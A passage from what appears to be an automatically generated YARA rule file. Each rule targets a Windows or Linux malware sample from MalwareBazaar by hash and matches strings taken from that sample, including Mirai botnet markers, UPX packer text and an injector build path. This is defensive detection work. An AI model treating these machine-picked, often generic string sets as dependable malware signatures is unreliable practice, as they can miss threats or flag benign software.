        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff/F/"
        $s2 = "4B/ 1"
        $s3 = "5\\RmG"
        $s4 = "s2/mf"
        $s5 = "0e1T\\e"
        $s6 = "Cg\\wra"
        $s7 = "Cc\\s2a"
        $s8 = "Cb\\fca"
        $s9 = "8tX3\\9"
        $s10 = "/cgj6"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 106KB
        and all of them
}

rule Windows_a09597f979954024fbd12b32dbbfe982d7ca8057b5271126acba68202fd9feaa{
    meta:
        description = "Auto ML: a09597f979954024fbd12b32dbbfe982d7ca8057b5271126acba68202fd9feaa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "MSVBVM60.DLL"
        $s4 = "IRR / NPV / Value Chain"
        $s5 = "RichTextLib.RichTextBox"
        $s6 = "This sets the size as the default. Use it to create shapes of the same size."
        $s7 = "MSComDlg.CommonDialog"
        $s8 = "XXX123.CoolerBar"
        $s9 = "MSScriptControlCtl.ScriptControl"
        $s10 = "XXX123.FlowShape"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_a0a8bde092f8f6f346839e2862d03749d730f274369bb7bb11c1263e7ee6ec95{
    meta:
        description = "Auto ML: a0a8bde092f8f6f346839e2862d03749d730f274369bb7bb11c1263e7ee6ec95"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "c A.I"
        $s3 = "j\\AHYf"
        $s4 = "v4.0.30319"
        $s5 = "System.Reflection"
        $s6 = ".ctor"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "System.Diagnostics"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 366KB
        and all of them
}

rule Windows_a0cb5554307e10606f04ea9ffa42b6e382bc874fe5a42be5347f91569de9f115{
    meta:
        description = "Auto ML: a0cb5554307e10606f04ea9ffa42b6e382bc874fe5a42be5347f91569de9f115"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".ndata"
        $s3 = ".rsrc"
        $s4 = "tTj\\V"
        $s5 = ".DEFAULT\\Control Panel\\International"
        $s6 = "Control Panel\\Desktop\\ResourceLocale"
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s8 = "\\Microsoft\\Internet Explorer\\Quick Launch"
        $s9 = "ADVAPI32.dll"
        $s10 = "SHELL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4438KB
        and all of them
}

rule Windows_a1a75a717953ccb8afbdba7f5dae113dba630c6c90820f927f41d28782ed483b{
    meta:
        description = "Auto ML: a1a75a717953ccb8afbdba7f5dae113dba630c6c90820f927f41d28782ed483b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "R2q.F"
        $s3 = ".7ib3"
        $s4 = "kstZ/"
        $s5 = "M/918"
        $s6 = "ole32.dll"
        $s7 = ".ocOU"
        $s8 = "Zz/3OC"
        $s9 = "mC.EI"
        $s10 = "G.gN/"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6467KB
        and all of them
}

rule Windows_a1ceabd5d93711c115e88096a4af5133382cd27df50b7cd412397fa16b96600a{
    meta:
        description = "Auto ML: a1ceabd5d93711c115e88096a4af5133382cd27df50b7cd412397fa16b96600a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "PQhL/B"
        $s4 = "t hh/B"
        $s5 = "Lqt\\s"
        $s6 = ":\\S78"
        $s7 = "3\\hL2"
        $s8 = ".a/6Q"
        $s9 = "Y.Ml2"
        $s10 = "1/:bj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 314KB
        and all of them
}

rule Windows_a1e1569dfcaedc7962d5af6fcb5b022b5faddeef372cd7458fd3f383e0dcd560{
    meta:
        description = "Auto ML: a1e1569dfcaedc7962d5af6fcb5b022b5faddeef372cd7458fd3f383e0dcd560"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "63.q 9"
        $s3 = "v4.0.30319"
        $s4 = "Moyzenm.exe"
        $s5 = "Moyzenm.States"
        $s6 = "Bercsij.Common"
        $s7 = "Moyzenm.Instances"
        $s8 = "Bercsij.Mocks"
        $s9 = "Bercsij.Filter"
        $s10 = ".cctor"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 65KB
        and all of them
}

rule Windows_a204ddc8a7255acf6311bee486d3b64254fa88f1f75a7de88bcf4d8397aaaadb{
    meta:
        description = "Auto ML: a204ddc8a7255acf6311bee486d3b64254fa88f1f75a7de88bcf4d8397aaaadb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s2 = ".text"
        $s3 = ".rsrc"
        $s4 = "V\\UWR"
        $s5 = "\\SUVW"
        $s6 = "F\\PhF"
        $s7 = "F\\Phh"
        $s8 = "tlHt."
        $s9 = "t/WWUPj"
        $s10 = "F\\jLSP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 672KB
        and all of them
}

rule Windows_a2081d8d6fd0ce01c305d322633b1a36b3e9f3c54ab4bc7a75411dfe7f3d77b4{
    meta:
        description = "Auto ML: a2081d8d6fd0ce01c305d322633b1a36b3e9f3c54ab4bc7a75411dfe7f3d77b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "MSVBVM60.DLL"
        $s4 = "IRR / NPV / Value Chain"
        $s5 = "RichTextLib.RichTextBox"
        $s6 = "This sets the size as the default. Use it to create shapes of the same size."
        $s7 = "MSComDlg.CommonDialog"
        $s8 = "XXX123.CoolerBar"
        $s9 = "MSScriptControlCtl.ScriptControl"
        $s10 = "XXX123.FlowShape"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_a22a4df8d6f89b8a880e15dc6ee0c197252d8bd70b6b98ddfafcc73f9bc274ba{
    meta:
        description = "Auto ML: a22a4df8d6f89b8a880e15dc6ee0c197252d8bd70b6b98ddfafcc73f9bc274ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.IO"
        $s4 = "System.Xml.Schema"
        $s5 = "System.Data"
        $s6 = "System.Collections.Generic"
        $s7 = "HNjr.exe"
        $s8 = "System.Threading"
        $s9 = "System.Runtime.Versioning"
        $s10 = "System.Drawing"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 629KB
        and all of them
}

rule Windows_10b71b9870e8b389acdf0874c2d49d392a9d9d227fd37e9f12c290b217f95fc0{
    meta:
        description = "Auto ML: 10b71b9870e8b389acdf0874c2d49d392a9d9d227fd37e9f12c290b217f95fc0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.Drawing.Drawing2D"
        $s4 = "System.Collections.Generic"
        $s5 = "add_ScrollLeftPressedChanged"
        $s6 = "remove_ScrollLeftPressedChanged"
        $s7 = "OnScrollLeftPressedChanged"
        $s8 = "get_ScrollLeftPressed"
        $s9 = "SetScrollLeftPressed"
        $s10 = "_scrollLeftPressed"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 903KB
        and all of them
}

rule Linux_a22e3e18da3a7ff50e1079ef579a200f3e5143dbfb6e45d97467e9f4638b9e6c{
    meta:
        description = "Auto ML: a22e3e18da3a7ff50e1079ef579a200f3e5143dbfb6e45d97467e9f4638b9e6c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PPSh\\1"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s6 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s7 = "/proc/"
        $s8 = "mirai."
        $s9 = ".arm5"
        $s10 = ".arm6"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 51KB
        and all of them
}

rule Linux_a27077a912f26f983b7077ae3dcf11c85a508d9eb4cd773cd46797d4784a7110{
    meta:
        description = "Auto ML: a27077a912f26f983b7077ae3dcf11c85a508d9eb4cd773cd46797d4784a7110"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "BQ6\\cN0"
        $s2 = "\\DVtx"
        $s3 = "xY--."
        $s4 = "\\WkSr"
        $s5 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_a2768ad8cc4dcd602b052d7f129f97eb709f16a5b5857c306e09efd538d7cd6e{
    meta:
        description = "Auto ML: a2768ad8cc4dcd602b052d7f129f97eb709f16a5b5857c306e09efd538d7cd6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "l/\\b/"
        $s3 = "T.up/"
        $s4 = "6E/F9"
        $s5 = "TkHp/"
        $s6 = "lu11/"
        $s7 = "luWl."
        $s8 = "Tjaq/"
        $s9 = "TAYq/"
        $s10 = "lukG."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 450KB
        and all of them
}

rule Linux_a2abbd6f00cbce6938ebe0c9766280412054364b3df1da504fe47ef527882fe8{
    meta:
        description = "Auto ML: a2abbd6f00cbce6938ebe0c9766280412054364b3df1da504fe47ef527882fe8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s6 = "GET /"
        $s7 = "HEAD /"
        $s8 = "POST /"
        $s9 = "HTTP/1.1 404 Not Found"
        $s10 = "HTTP/1.1 200 OK"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 194KB
        and all of them
}

rule Linux_a2e1ff0cf8173061af6f2e5b25ac02a78714a043d2aeca3dce4169f2ecb85140{
    meta:
        description = "Auto ML: a2e1ff0cf8173061af6f2e5b25ac02a78714a043d2aeca3dce4169f2ecb85140"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/self"
        $s2 = "/proc/self/exe"
        $s3 = "/tmp/tempXXXXXX"
        $s4 = "/proc/self/cmdline"
        $s5 = "Input/output error"
        $s6 = ".lib section in a.out corrupted"
        $s7 = "Remote I/O error"
        $s8 = "/dev/urandom"
        $s9 = "/dev/random"
        $s10 = ".shstrtab"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
        and all of them
}

rule Linux_a39e5649a4cd0d4c5221d7e4de521cc2da74ee9a685d05ea55a22b5e86b9793d{
    meta:
        description = "Auto ML: a39e5649a4cd0d4c5221d7e4de521cc2da74ee9a685d05ea55a22b5e86b9793d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "/dev/null"
        $s3 = ".shstrtab"
        $s4 = ".init"
        $s5 = ".text"
        $s6 = ".fini"
        $s7 = ".rodata"
        $s8 = ".ctors"
        $s9 = ".dtors"
        $s10 = ".data"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Linux_a3dae724f790b6beeafeb1d062400a4fd17bfa733b88bb2eed90540c2f2575b7{
    meta:
        description = "Auto ML: a3dae724f790b6beeafeb1d062400a4fd17bfa733b88bb2eed90540c2f2575b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "u\\PPSV"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s6 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s7 = "GET /"
        $s8 = "HEAD /"
        $s9 = "POST /"
        $s10 = "HTTP/1.1 404 Not Found"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB
        and all of them
}

rule Windows_a3e83742c685ef5027595a0a79075b8422f61bb509994550a81a4136f376a6f6{
    meta:
        description = "Auto ML: a3e83742c685ef5027595a0a79075b8422f61bb509994550a81a4136f376a6f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "V\\UWR"
        $s4 = "\\SUVW"
        $s5 = "F\\PhF"
        $s6 = "F\\Phh"
        $s7 = "tlHt."
        $s8 = "t/WWUPj"
        $s9 = "F\\jLSP"
        $s10 = "gdiplus.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1648KB
        and all of them
}

rule Windows_a3e85675e054df97943915de73ac25572f5bf0b46dbed7b3c17413c44e21f5f7{
    meta:
        description = "Auto ML: a3e85675e054df97943915de73ac25572f5bf0b46dbed7b3c17413c44e21f5f7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "Doc_110678602pdf.exe"
        $s4 = "System.Collections.Concurrent"
        $s5 = "System.Collections.Generic"
        $s6 = "System.Diagnostics"
        $s7 = "System.IO"
        $s8 = "System.Net"
        $s9 = "System.Reflection"
        $s10 = "System.Reflection.Emit"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 47KB
        and all of them
}

rule Windows_a4126b3c8ddadad5cc7470f1e967cfe6e2370aec7a20a815ae3ef48b774a22b0{
    meta:
        description = "Auto ML: a4126b3c8ddadad5cc7470f1e967cfe6e2370aec7a20a815ae3ef48b774a22b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "B.idata"
        $s2 = ".rsrc"
        $s3 = ".boot"
        $s4 = "d1OW\\"
        $s5 = "\\bgOF"
        $s6 = "/__f0"
        $s7 = "wK3dz_\\"
        $s8 = "L\\U8G"
        $s9 = "gfD5.1"
        $s10 = "/PmTl"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2631KB
        and all of them
}

rule Windows_10fa07a25654e8027da79c6ce9b04e2d41b68d6c7624f510e8251b4b95fd103e{
    meta:
        description = "Auto ML: 10fa07a25654e8027da79c6ce9b04e2d41b68d6c7624f510e8251b4b95fd103e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".reloc"
        $s3 = "c\\f M"
        $s4 = ".Y \\-"
        $s5 = "e E.o"
        $s6 = "UnX \\6"
        $s7 = ".Y on"
        $s8 = "pNa \\V2"
        $s9 = "v4.0.30319"
        $s10 = "-I.d."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1788KB
        and all of them
}

rule Windows_a46266ddb15dccb8b2a5bb023ae3fe3ca5afc5972559252721eba30d30d7d996{
    meta:
        description = "Auto ML: a46266ddb15dccb8b2a5bb023ae3fe3ca5afc5972559252721eba30d30d7d996"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".idata"
        $s3 = "advapi32.dll"
        $s4 = "setupx.dll"
        $s5 = "setupapi.dll"
        $s6 = "advpack.dll"
        $s7 = "wininit.ini"
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s9 = "msdownld.tmp"
        $s10 = "Control Panel\\Desktop\\ResourceLocale"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB
        and all of them
}

rule Windows_a4725ff36d69bd48e7b489e2d38bdbd72c4275c95c07372efcf4e80a756c77e7{
    meta:
        description = "Auto ML: a4725ff36d69bd48e7b489e2d38bdbd72c4275c95c07372efcf4e80a756c77e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "Whirtles.exe"
        $s4 = "System.Windows.Forms"
        $s5 = "VisualPlus.Structure"
        $s6 = "VisualPlus.Native"
        $s7 = "VisualPlus.Enumerators"
        $s8 = "VisualPlus.Constants"
        $s9 = "XRails.Controls"
        $s10 = "XRails_LeftPanel"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_a4b0ee25d1fcedd5c3acb39e5a04a1b3a2e6df417d6522d96e74c1411e80df73{
    meta:
        description = "Auto ML: a4b0ee25d1fcedd5c3acb39e5a04a1b3a2e6df417d6522d96e74c1411e80df73"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "2.dly"
        $s2 = "uJx.8"
        $s3 = "i\\KERN"
        $s4 = "4MEL32.d"
        $s5 = "T/PqJP"
        $s6 = "G/EUsz"
        $s7 = "mlock.c/"
        $s8 = "_HEAP_SELECTED/MSVCRT"
        $s9 = ". _run4me err"
        $s10 = "-b3tyf."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 121KB
        and all of them
}

rule Linux_a4efa5353fd2e66e4b893d4b3b918d8fca3c9b2ef7c50fb0a99f43a56c9ba053{
    meta:
        description = "Auto ML: a4efa5353fd2e66e4b893d4b3b918d8fca3c9b2ef7c50fb0a99f43a56c9ba053"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Q\\XCn"
        $s2 = "/fsko"
        $s3 = "l3.h\\V"
        $s4 = "qq7\\n"
        $s5 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 24KB
        and all of them
}

rule Windows_a50118bac3fb65a828d03e2edb5492112070084f6707527a2fc964cb1ea22623{
    meta:
        description = "Auto ML: a50118bac3fb65a828d03e2edb5492112070084f6707527a2fc964cb1ea22623"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.Runtime.CompilerServices"
        $s4 = ".ctor"
        $s5 = "System.Diagnostics"
        $s6 = "System.Reflection"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Runtime.Versioning"
        $s9 = "EKJd.exe"
        $s10 = "System.Windows.Forms"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 860KB
        and all of them
}

rule Windows_a51a4a7e75a96f9361ab250f68f80d50feedffd76551fc989a2f3966156dc6b4{
    meta:
        description = "Auto ML: a51a4a7e75a96f9361ab250f68f80d50feedffd76551fc989a2f3966156dc6b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "kernel32.dll"
        $s7 = "m/d/yy"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB
        and all of them
}

rule Windows_a52bf253f87035bf054f9ceb9a7296b980537fa478a09b4f1ae000b819ba5e29{
    meta:
        description = "Auto ML: a52bf253f87035bf054f9ceb9a7296b980537fa478a09b4f1ae000b819ba5e29"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "Cdki\\"
        $s4 = "eA6/o"
        $s5 = "M/6b-H4"
        $s6 = "o-kI/"
        $s7 = ".kIjg-"
        $s8 = "Gzw/wol"
        $s9 = "D1-X/"
        $s10 = "f6.N\\"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 178KB
        and all of them
}

rule Windows_a55d0d1030b4e204c432033a95ea8a2e3e3b88ec5db13ffca30d185740002df7{
    meta:
        description = "Auto ML: a55d0d1030b4e204c432033a95ea8a2e3e3b88ec5db13ffca30d185740002df7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".pdata"
        $s3 = "IO\\3:"
        $s4 = "C:\\Users\\wins\\Desktop\\dyg\\project injs\\build\\injector.pdb"
        $s5 = ".00cfg"
        $s6 = ".rdata"
        $s7 = ".xdata"
        $s8 = ".data"
        $s9 = "KERNEL32.dll"
        $s10 = "USER32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB
        and all of them
}

rule Windows_a56ab2abe69823efba8192aad89c0521b3869f091752ce63e7ec399f679b1768{
    meta:
        description = "Auto ML: a56ab2abe69823efba8192aad89c0521b3869f091752ce63e7ec399f679b1768"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "Microsoft.Win32"
        $s4 = "System.Drawing.Drawing2D"
        $s5 = "System.IO"
        $s6 = "get_ScanFTP"
        $s7 = "set_ScanFTP"
        $s8 = "System.Collections.Generic"
        $s9 = "<ScanFTP>k__BackingField"
        $s10 = "<Http>k__BackingField"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 95KB
        and all of them
}

rule Windows_a56b22a39525ddd24a449fca6f955fa6618312e93a0e3bdac810eee9efc4616e{
    meta:
        description = "Auto ML: a56b22a39525ddd24a449fca6f955fa6618312e93a0e3bdac810eee9efc4616e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "j\\Yf9"
        $s4 = "j\\Xf9F"
        $s5 = "f99t7SVj."
        $s6 = "/hpmL"
        $s7 = "u\\PPRj"
        $s8 = "kernel32.dll"
        $s9 = "MM/dd/yy"
        $s10 = "AiFC."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1180KB
        and all of them
}

rule Windows_1181cfd2b34e7be8a43ea7335ae541ee72c2fb50ab86c1ca0155864965766a55{
    meta:
